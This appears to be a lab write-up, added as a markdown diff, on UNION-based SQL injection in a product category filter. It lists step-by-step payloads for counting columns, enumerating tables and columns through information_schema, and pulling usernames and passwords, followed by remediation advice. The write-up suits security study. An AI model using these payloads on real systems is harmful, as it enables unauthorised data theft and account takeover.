@@ -1,0 +1,95 @@
+# 🔓 SQL Injection – Listing Database Contents (Non-Oracle)
+
+---
+
+## 🧾 Summary
+A SQL injection vulnerability was identified in a product category filter parameter. The application fails to properly sanitise user input, allowing arbitrary SQL queries to be executed.
+
+Using a UNION-based attack, database table names and contents were successfully enumerated.
+
+---
+
+## 🎯 Impact
+An attacker can extract sensitive data directly from the database.
+
+This may include:
+- Usernames and passwords
+- Personal data
+- Application secrets
+
+---
+
+## 🔍 Steps to Reproduce
+
+1. Navigate to a product category page:
+/filter?category=Gifts
+
+
+2. Intercept the request using Burp Suite.
+
+3. Determine the number of columns using ORDER BY:
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+Continue until an error occurs.
+4. Identify columns that accept text:
+
+' UNION SELECT NULL, 'test'--
+
+5. Enumerate table names:
+
+' UNION SELECT NULL, table_name FROM information_schema.tables--
+6. Identify a users table (e.g. users)
+
+7. Extract column names:
+
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
+
+8. Extract data from the table:
+
+' UNION SELECT username, password FROM users--
+
+💥 Proof of Concept
+📌 Request
+GET /filter?category=' UNION SELECT username, password FROM users-- HTTP/1.1
+Host: vulnerable-site.com
+📌 Result
+
+The application returned database contents, including usernames and passwords, within the HTTP response.
+
+📸 Evidence
+🔹 Injected UNION Payload
+
+The payload was used to extract data from the database.
+
+🔹 Extracted Data
+
+The response displays database contents retrieved via SQL injection.
+
+🛠️ Remediation
+
+To prevent SQL injection:
+
+Use parameterised queries (prepared statements)
+Avoid dynamic SQL construction
+Validate and sanitise all user inputs
+Apply least privilege to database users
+🧠 Key Learning
+
+UNION-based SQL injection allows attackers to combine results from arbitrary queries with the application's original query.
+
+Key takeaway: Unsanitised input can expose entire databases.
+
+🧪 Tester Notes
+The application reflects query results directly in the response
+No input filtering or escaping was observed
+Database appears to support information_schema, indicating MySQL/PostgreSQL
+🌍 Real-World Scenario
+
+In a real application, this vulnerability could allow attackers to dump entire user databases, leading to:
+
+Account takeovers
+Data breaches
+Regulatory violations
